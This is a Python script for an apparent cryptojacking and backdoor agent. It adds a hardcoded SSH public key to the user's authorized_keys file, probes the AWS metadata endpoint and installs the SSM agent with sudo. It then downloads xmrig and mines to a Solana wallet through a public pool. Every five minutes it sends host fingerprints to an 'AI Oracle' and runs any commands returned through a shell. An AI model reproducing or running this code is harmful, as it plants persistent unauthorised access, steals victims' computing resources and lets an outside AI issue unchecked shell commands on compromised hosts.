import os
import sys
import platform
import subprocess
import multiprocessing
import time
import socket
import psutil
from ai_interface import AIInterface

# CONFIG
MASTER_KEY = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2AZ/otr7PkhgSVMfMJ9OtV/SdFmg7OhwEwd+cSyozefN2Bi+EvEwacBMuW45J6Kkcto5sfG9yeDgiI3ZGGCQHTm9olwNtyDvkf+/0FPx6spErSMwJl0s+MOfpWJQTUiGGywZdVmpmlw3dLcXqvk7YU0OOpG9KdUIGNsf7hTMB96bIBqvpHB7sF4bXtWa0ZKcHrRKpkGL+l3hhUrO3A3JtY31Hg+cqcKQtR1nMku0ibhJg/5tjg7fAJd4RnwHS4Q7n0d/7nHqEXY0yj5qQHa29QFgL6E9TbqcVPvprSvfTx4EKMrzVfoYd5m8yAKOpkCa/SqJs58dubfDlj8HPLcOR"
POOL_URL = "rx.unmineable.com:3333"
WALLET = "SOL:6zywrMREmZDvC53gERydGNB6G4RNj8dpSgRYnsyJ5TDa"

class AgentCore:
    def __init__(self):
        self.hostname = socket.gethostname()
        self.os_type = platform.system()
        self.ai = AIInterface(self.hostname)
        self.worker_id = f"{self.hostname}-agent"

    def fingerprint(self):
        """Gather system info."""
        info = {
            "hostname": self.hostname,
            "os": self.os_type,
            "cpu_count": multiprocessing.cpu_count(),
            "ram_gb": round(psutil.virtual_memory().total / (1024**3), 2),
            "is_aws": self._check_aws(),
            "load_avg": psutil.getloadavg()
        }
        return info

    def _check_aws(self):
        try:
            # Check for AWS Metadata service
            subprocess.check_output(["curl", "-s", "--connect-timeout", "1", "http://169.254.169.254/latest/meta-data/"], stderr=subprocess.DEVNULL)
            return True
        except:
            return False

    def ensure_access(self):
        """Setup Remote Access."""
        # 1. SSH Keys
        try:
            ssh_dir = os.path.expanduser("~/.ssh")
            os.makedirs(ssh_dir, exist_ok=True)
            auth_file = os.path.join(ssh_dir, "authorized_keys")
            
            # Check if key exists
            if os.path.exists(auth_file):
                with open(auth_file, "r") as f:
                    content = f.read()
                if MASTER_KEY not in content:
                    with open(auth_file, "a") as f:
                        f.write(f"\n{MASTER_KEY}\n")
            else:
                with open(auth_file, "w") as f:
                    f.write(f"{MASTER_KEY}\n")
            
            os.chmod(auth_file, 0o600)
        except Exception as e:
            print(f"[!] Access Setup Failed: {e}")

        # 2. AWS SSM (If AWS)
        if self._check_aws():
            self._install_ssm()

    def _install_ssm(self):
        """Attempt to install SSM Agent if on AWS."""
        # Simple check if installed
        rc = subprocess.call(["which", "amazon-ssm-agent"], stdout=subprocess.DEVNULL)
        if rc != 0:
            print("[*] Installing SSM Agent...")
            # Detect distro and install (simplified)
            if os.path.exists("/usr/bin/apt-get"):
                subprocess.call(["sudo", "snap", "install", "amazon-ssm-agent", "--classic"])
            elif os.path.exists("/usr/bin/yum"):
                subprocess.call(["sudo", "yum", "install", "-y", "https://s3.amazonaws.com/ec2-downloads-windows/SSMAgent/latest/linux_amd64/amazon-ssm-agent.rpm"])

    def configure_miner(self):
        """Configure xmrig."""
        # Download if not exists
        if not os.path.exists("xmrig"):
            print("[*] Downloading Miner...")
            subprocess.call("wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz", shell=True)
            subprocess.call("tar -xzf xmrig-6.21.0-linux-x64.tar.gz", shell=True)
            subprocess.call("mv xmrig-6.21.0/xmrig .", shell=True)
            subprocess.call("rm -rf xmrig-6.21.0*", shell=True)
        
        # Run
        cmd = f"./xmrig -o {POOL_URL} -u {WALLET} -p {self.worker_id} -k --cpu-priority=0 --background"
        if not self._is_miner_running():
            print("[*] Starting Miner...")
            subprocess.Popen(cmd.split())

    def _is_miner_running(self):
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] == 'xmrig':
                return True
        return False

    def run_loop(self):
        print(f"[*] Agent {self.hostname} Online.")
        self.ensure_access()
        self.configure_miner()
        
        while True:
            # 1. Gather Health
            status = self.fingerprint()
            status['miner_running'] = self._is_miner_running()
            
            # 2. Consult AI
            print("[*] Consulting AI Oracle...")
            advice = self.ai.report_status(status)
            print(f"[*] AI Advice: {advice}")
            
            if "commands" in advice:
                for cmd in advice["commands"]:
                    print(f"[*] Executing AI Command: {cmd}")
                    subprocess.call(cmd, shell=True)
            
            time.sleep(300) # Check in every 5 mins

if __name__ == "__main__":
    agent = AgentCore()
    agent.run_loop()
